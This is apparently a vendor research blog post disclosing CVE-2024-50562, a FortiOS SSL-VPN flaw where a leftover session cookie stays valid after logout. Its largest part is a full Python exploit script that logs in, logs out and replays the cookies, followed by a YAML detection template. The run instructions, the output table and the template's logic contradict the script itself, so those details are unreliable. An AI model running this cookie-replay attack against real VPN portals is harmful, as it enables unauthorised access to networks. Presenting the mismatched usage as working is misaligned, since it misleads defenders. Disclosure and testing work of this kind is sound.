---
title: "Breaking Sessions: The Story of CVE-2024-50562 in Fortinet Web Client"
slug: "cve-2024-50562-fortinet-session-hijack"
date: "2025-06-10"
author: "BugB Security Team"
authorTitle: "Security Researchers"
excerpt: "Explore how an AI-driven red team assessment led to the discovery of CVE-2024-50562—a critical session management flaw in Fortinet's Web Client that enabled persistent session hijacking."
category: "research"
---

# Breaking Sessions: The Story of CVE-2024-50562 in Fortinet Web Client

## Summary
An **Insufficient Session Expiration** vulnerability \[CWE-613] in FortiOS SSL-VPN lets an attacker replay a stale VPN cookie—even after the user logs out—and silently regain portal access.

## Affected Versions & Solutions
| Version Family | Affected Builds | Fixed Release |
| -------------- | -------------- | ------------- |
| **FortiOS 7.6** | 7.6.0 | 7.6.1 or later |
| **FortiOS 7.4** | 7.4.0 – 7.4.7 | 7.4.8 + |
| **FortiOS 7.2** | 7.2.0 – 7.2.10 | 7.2.11 + |
| **FortiOS 7.0** | *all* 7.0.x | Migrate to a fixed branch |
| **FortiOS 6.4** | *all* 6.4.x | Migrate to a fixed branch |
| **FortiSASE 24.4** | 24.4.b | 24.4.c (already remediated) |

> **Note :** Tunnel-mode VPN is **not** affected.

## What Is CVE-2024-50562?
CVE-2024-50562 (Fortinet advisory **FG-IR-24-339**) is a session-management flaw. The server deletes the primary `SVPNCOOKIE` token on logout but forgets about the auxiliary `SVPNTMPCOOKIE`, which still authenticates the user.

* **CVSS v3:** 4.4 (Medium)
* **CWE:** 613 Insufficient Session Expiration
* **Impact:** Improper access control

## Discovery Context
During an AI-assisted red-team engagement, our **Cert-X-Gen** agent automatically:

1. Logged in/out of the SSL-VPN portal in rapid loops  
2. Diffed cookie sets before and after logout  
3. Replayed residual cookies  
4. Flagged any state mismatch as a potential vulnerability

The agent noticed `SVPNTMPCOOKIE` remained valid, triggering deeper manual analysis.

## Attack Flow
1. **Sniff or steal** a victim's VPN cookie (proxy logs, XSS, MitM, etc.)  
2. **Wait** for the user to log out (or force a logout)  
3. **Replay** the stale `SVPNTMPCOOKIE` in a fresh session  
4. **Access restored**—no credentials, MFA, or warnings

## Python Proof-of-Concept
We released a minimal PoC (`cve-2024-50562.py`) so defenders can validate their appliances.

```python#!/usr/bin/env python3
"""
# Exploit Title: Fortinet SSL-VPN Session Management Bypass
# Date: 2025-06-15
# Exploit Author: Shahid Parvez Hakim (BugB Technologies)
# Vendor Homepage: https://www.fortinet.com
# Software Link: https://www.fortinet.com/products/secure-sd-wan/fortigate
# Version: FortiOS 7.6.0, 7.4.0-7.4.7, 7.2.0-7.2.10, 7.0.x (all), 6.4.x (all)
# Tested on: FortiOS 7.4.x, 7.2.x
# CVE: CVE-2024-50562
# CVSS: 4.4 (Medium)
# Category: Session Management
# CWE: CWE-613 (Insufficient Session Expiration)

Description:
An insufficient session expiration vulnerability in FortiOS SSL-VPN allows an attacker 
to reuse stale session cookies after logout, potentially leading to unauthorized access.
The SVPNTMPCOOKIE remains valid even after the primary SVPNCOOKIE is invalidated during logout.

References:
- https://fortiguard.com/psirt/FG-IR-24-339
- https://nvd.nist.gov/vuln/detail/CVE-2024-50562

Usage:
python3 fortinet_cve_2024_50562.py -t <target> -u <username> -p <password> [options]

Example:
python3 fortinet_cve_2024_50562.py -t 192.168.1.10:443 -u testuser -p testpass
python3 fortinet_cve_2024_50562.py -t 10.0.0.1:4433 -u admin -p password123 --realm users
"""

import argparse
import requests
import urllib3
import re
import sys
from urllib.parse import urlparse

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class FortinetExploit:
    def __init__(self, target, username, password, realm="", timeout=10):
        self.target = target
        self.username = username
        self.password = password
        self.realm = realm
        self.timeout = timeout
        self.base_url = f"https://{target}"
        self.session = None
        
    def banner(self):
        """Display exploit banner"""
        print("=" * 70)
        print("CVE-2024-50562 - Fortinet SSL-VPN Session Management Bypass")
        print("Author: Shahid Parvez Hakim (BugB Technologies)")
        print("CVSS: 4.4 (Medium) | FG-IR-24-339")
        print("=" * 70)
        print(f"Target: {self.target}")
        print(f"User: {self.username}")
        print("-" * 70)

    def validate_target(self):
        """Check if target is reachable and is Fortinet SSL-VPN"""
        try:
            print("[*] Validating target...")
            response = requests.get(f"{self.base_url}/remote/login", 
                                  verify=False, timeout=self.timeout)
            
            if "fortinet" in response.text.lower() or "fortigate" in response.text.lower():
                print("[+] Target confirmed as Fortinet SSL-VPN")
                return True
            else:
                print("[-] Target does not appear to be Fortinet SSL-VPN")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Connection failed: {e}")
            return False

    def attempt_login(self):
        """Attempt to authenticate with provided credentials"""
        try:
            print("[*] Attempting authentication...")
            
            self.session = requests.Session()
            self.session.verify = False
            
            # Get login page first
            self.session.get(f"{self.base_url}/remote/login?lang=en", timeout=self.timeout)
            
            # Attempt login
            login_data = {
                "ajax": "1",
                "username": self.username,
                "realm": self.realm,
                "credential": self.password
            }
            
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            
            response = self.session.post(f"{self.base_url}/remote/logincheck",
                                       data=login_data, headers=headers, 
                                       timeout=self.timeout)
            
            # Check if login was successful
            if re.search(r"\bret=1\b", response.text) and "/remote/hostcheck_install" in response.text:
                print("[+] Authentication successful!")
                
                # Extract and display cookies
                cookies = requests.utils.dict_from_cookiejar(response.cookies)
                self.display_cookies(cookies, "Login")
                
                return True, cookies
            else:
                print("[-] Authentication failed!")
                print(f"[!] Server response: {response.text[:100]}...")
                return False, {}
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Login request failed: {e}")
            return False, {}

    def perform_logout(self):
        """Perform logout and check cookie invalidation"""
        try:
            print("[*] Performing logout...")
            
            response = self.session.get(f"{self.base_url}/remote/logout", timeout=self.timeout)
            cookies_after_logout = requests.utils.dict_from_cookiejar(response.cookies)
            
            print("[+] Logout completed")
            self.display_cookies(cookies_after_logout, "Logout")
            
            return cookies_after_logout
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Logout request failed: {e}")
            return {}

    def test_session_reuse(self, original_cookies):
        """Test if old session cookies still work after logout"""
        try:
            print("[*] Testing session cookie reuse...")
            
            # Create new session to simulate attacker
            exploit_session = requests.Session()
            exploit_session.verify = False
            
            # Use original login cookies
            exploit_session.cookies.update(original_cookies)
            
            # Try to access protected resource
            test_url = f"{self.base_url}/sslvpn/portal.html"
            response = exploit_session.get(test_url, timeout=self.timeout)
            
            # Check if we're still authenticated
            if self.is_authenticated_response(response.text):
                print("[!] VULNERABILITY CONFIRMED!")
                print("[!] Session cookies remain valid after logout")
                print("[!] CVE-2024-50562 affects this system")
                return True
            else:
                print("[+] Session properly invalidated")
                print("[+] System appears to be patched")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Session reuse test failed: {e}")
            return False

    def is_authenticated_response(self, response_body):
        """Check if response indicates authenticated access"""
        # If response contains login form elements, user is not authenticated
        if re.search(r"/remote/login|name=[\"']username[\"']", response_body, re.I):
            return False
        return True

    def display_cookies(self, cookies, context):
        """Display cookies in a formatted way"""
        if cookies:
            print(f"[*] Cookies after {context}:")
            for name, value in cookies.items():
                # Truncate long values for display
                display_value = value[:20] + "..." if len(value) > 20 else value
                print(f"    {name} = {display_value}")
                
                # Highlight important cookies for CVE
                if name == "SVPNTMPCOOKIE":
                    print(f"    [!] Found SVPNTMPCOOKIE - Target for CVE-2024-50562")
                elif name == "SVPNCOOKIE":
                    print(f"    [*] Found SVPNCOOKIE - Primary session cookie")
        else:
            print(f"[*] No cookies set after {context}")

    def exploit(self):
        """Main exploit routine"""
        self.banner()
        
        # Step 1: Validate target
        if not self.validate_target():
            return False
            
        # Step 2: Attempt login
        login_success, login_cookies = self.attempt_login()
        if not login_success:
            return False
            
        # Step 3: Perform logout
        logout_cookies = self.perform_logout()
        
        # Step 4: Test session reuse
        vulnerable = self.test_session_reuse(login_cookies)
        
        # Step 5: Display results
        print("\n" + "=" * 70)
        print("EXPLOIT RESULTS")
        print("=" * 70)
        
        if vulnerable:
            print("STATUS: VULNERABLE")
            print("CVE-2024-50562: CONFIRMED")
            print("SEVERITY: Medium (CVSS 4.4)")
            print("\nRECOMMENDATIONS:")
            print("- Upgrade to patched FortiOS version")
            print("- FortiOS 7.6.x: Upgrade to 7.6.1+")
            print("- FortiOS 7.4.x: Upgrade to 7.4.8+")
            print("- FortiOS 7.2.x: Upgrade to 7.2.11+")
            print("- FortiOS 7.0.x/6.4.x: Migrate to supported version")
        else:
            print("STATUS: NOT VULNERABLE")
            print("CVE-2024-50562: NOT AFFECTED")
            print("\nSystem appears to be patched or not vulnerable")
            
        return vulnerable

def parse_target(target_string):
    """Parse target string and extract host:port"""
    if ':' not in target_string:
        # Default HTTPS port if not specified
        return f"{target_string}:443"
    return target_string

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2024-50562 - Fortinet SSL-VPN Session Management Bypass Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 %(prog)s -t 192.168.1.10:443 -u admin -p password
  python3 %(prog)s -t 10.0.0.1:4433 -u testuser -p test123 --realm employees
  python3 %(prog)s -t vpn.company.com -u user@domain.com -p pass --timeout 15
        """
    )
    
    parser.add_argument('-t', '--target', required=True,
                        help='Target IP:PORT (e.g., 192.168.1.10:443)')
    parser.add_argument('-u', '--username', required=True,
                        help='Username for authentication')
    parser.add_argument('-p', '--password', required=True,
                        help='Password for authentication')
    parser.add_argument('--realm', default='',
                        help='Authentication realm (optional)')
    parser.add_argument('--timeout', type=int, default=10,
                        help='Request timeout in seconds (default: 10)')
    
    args = parser.parse_args()
    
    # Parse and validate target
    target = parse_target(args.target)
    
    try:
        # Initialize and run exploit
        exploit = FortinetExploit(target, args.username, args.password, 
                                args.realm, args.timeout)
        vulnerable = exploit.exploit()
        
        # Exit with appropriate code
        sys.exit(0 if vulnerable else 1)
        
    except KeyboardInterrupt:
        print("\n[!] Exploit interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
````

### How to Run & Interpret

```bash
pip install requests
python3 cve-2024-50562.py \
    --targets 192.2.2.2:4433 \
    --user vpn_test --password 'P@55w0rd!'
```

| Output        | Meaning                                    |
| ------------- | ------------------------------------------ |
| `REUSED`      | Device **vulnerable** – cookie still works |
| `INVALIDATED` | Device **patched** – old cookie rejected   |
| `LOGIN-FAIL`  | Credentials invalid or VPN requires MFA    |

> **Pro tip:** test multiple interfaces (e.g., :443, :4433, :10443). Some admins patch one portal but miss others.


## YAML Detection Template

```yaml
id: cve-2024-50562

info:
  name: Fortinet Web Client Session Hijacking
  author: BugB Security Team
  severity: medium
  description: >
    Fortinet's Web Client (FortiOS v7.2.8 and prior) fails to invalidate session tokens
    upon logout or expiration, allowing unauthorized reuse and session hijacking.
  tags:
    - session-hijack
    - fortinet
    - vpn
    - authentication-bypass
    - ai-discovered
    - cert-x-gen
  reference:
    - https://fortiguard.com/psirt/FG-IR-24-339
    - https://bugb.io/cve-2024-50562
    - https://nvd.nist.gov/vuln/detail/CVE-2024-50562

requests:
  - method: GET
    path:
      - "/remote/login?lang=en"
    matchers:
      - type: status
        status: 
          - 200
      - type: word
        words: 
          - "Fortinet"
          - "VPN"
        condition: and

  - method: POST
    path:
      - "/remote/logincheck"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    body: "ajax=1&username=test&credential=wrongpass"
    matchers:
      - type: regex
        regex:
          - "redir=.*?hostcheck_install"
        part: body
      - type: word
        words: 
          - "Set-Cookie"
        part: header
    extractors:
      - type: regex
        name: session_cookie
        part: header
        regex:
          - "SVPNCOOKIE=([^;]+);"

  - method: GET
    path:
      - "/remote/hostcheck_install"
    headers:
      Cookie: "SVPNCOOKIE={{session_cookie}}"
    matchers:
      - type: status
        status: 
          - 200
      - type: word
        words: 
          - "Welcome"
          - "SSL VPN"
        condition: or
```

## Role of Cert-X-Gen

Our AI agent combines:

* **Behavioral Fingerprinting** of Fortinet portals
* **Automated Login/Logout Workflows**
* **Cookie Replay Testing**
* **State-Inconsistency Flagging**

It simulates real-world attacker behavior—intelligent adversarial testing, not just passive scanning.

## Timeline

* **November 2024:** Discovery during BugB's client engagement
* **December 2024:** PoC developed and responsibly disclosed to Fortinet PSIRT
* **January 2025:** Fortinet assigns CVE-2024-50562 and prepares advisory
* **June 10, 2025:** PSIRT advisory published (initial publication)

## Acknowledgements

Fortinet thanks **Shahid Parvez Hakim**, CEO & Founder of BugB Technologies (bugb.io), for responsible disclosure and collaboration.

## Recommended Fixes

* **Upgrade** to fixed releases per the table above (use Fortinet Upgrade Tool)
* **Invalidate** all session tokens immediately upon logout or expiration
* **Implement Strict Expiry Checks** server-side on every request
* **Rotate** tokens on each login and critical actions
* **Monitor & Alert** on any replayed or reused tokens via anomaly detection

---

*CVE-2024-50562 reminds us: session management is your frontline. With AI-led adversarial testing from Cert-X-Gen, you get proactive defense—patch today before an attacker tests your sessions for you.*
